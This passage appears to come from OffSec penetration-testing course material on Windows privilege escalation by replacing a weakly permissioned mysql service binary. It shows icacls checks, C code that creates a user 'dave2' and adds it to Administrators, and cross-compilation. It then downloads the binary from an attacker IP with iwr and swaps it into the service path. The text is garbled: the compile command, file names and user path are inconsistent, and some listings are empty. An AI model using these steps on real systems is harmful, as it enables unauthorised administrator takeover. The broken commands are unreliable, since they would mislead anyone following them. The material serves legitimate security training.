## Listing 413 - Permissions of httpd.exe

As member of the built-in Users group, dave has only Read and Execute (RX) rights on httpd.exe, meaning we cannot replace the file with a malicious binary.

Next, we will create mysql from the mysql source.

```
PS C:\Users\dave icacls "C:\xampp\mysql\bin\mysql.exe"
C:\xampp\mysql\bin\mysql.exe NT AUTHORITY\SYSTEM:(F)
  BUILTIN\Administrators:(F)
  BUILTIN\Users:(F)
```

Successfully processed 1 files; Failed processing 0 files

## Listing 414 - Permissions of mysql.exe

The output of Listing 414 shows that members of the Users group have the Full Access (F) permission, allowing us to write and modify the binary and therefore replace it. Due to the missing indicator, it was set on purpose and not inherited by the parent directory. Administrators often set Full Access permissions when they configure a service and are not sure about the required permissions. Setting to Full Access avoids most problems, but creates a security risk as we will show in this example.

Let's create a small binary on Kali which we will use to replace the original mysql.exe. The following C will create a user named dave2 and add that to local Administrators. The cross-compiled version of this code will serve as our malicious binary. Let's save it on Kali in a file named addUser.c.

```c
#include <stdlib.h>

int main () {
  int i;
  i = system("net user dave2 /add");
  i = system("net localgroup administrators dave2 /add");
  return 0;
}
```

# OffSec Penetration Testing with Kali Linux

Next, we will cross-compile the code on our machine with mingw64 as we learned in "Fixing Exploits". Since the target is 64-bit, we will cross-compile the C code to 64-bit application with x86_64-mingw32. In addition, we use adduser.exe as an argument for -o to specify the name of the compiled executable.

```
kali@kali~$ x86_64-mingw32-gcc adduser.exe -o adduser.exe
```

## Listing 416 - Cross-Compile the C to 64-bit application

Once adduser.exe is cross-compiled, we can transfer it in order to replace the original mysql.exe with our malicious copy. For this start, we use a Python web server in the directory of our Kali machine and use it over the target machine in a PowerShell window to download our executable. In addition, we move the original mysql.exe to our home directory. Then we can restore the service after a successful privilege escalation.

```
PS C:\Users\ave> iwr -uri http://192.168.119.3/adduser.exe -Outfile adduser.exe
PS C:\Users\ave> move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
PS C:\Users\ave> move adduser.exe C:\xampp\mysql\bin\mysqld.exe
```

In order to execute the binary through the service, we need to restart it. We can use the net command to start the service.


## Listing 418 - Attempting to stop the service in order to restart it

Unfortunately, dave doesn't have sufficient permissions to stop the service. This is expected as most services are only managed by administrative users.

Since we do not have permission to manually restart the service, we must consider another approach. If the Startup Type is set to "Automatic", we may be able to restart the service by rebooting the machine. Let's check the Startup Type of the mysql service with the help of the Get-CimInstance by selecting Name and StartMode as filter for the service "mysql" with Where-Object.

```
PS C:\Users\ave> Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
Name StartMode
mysql Auto
```
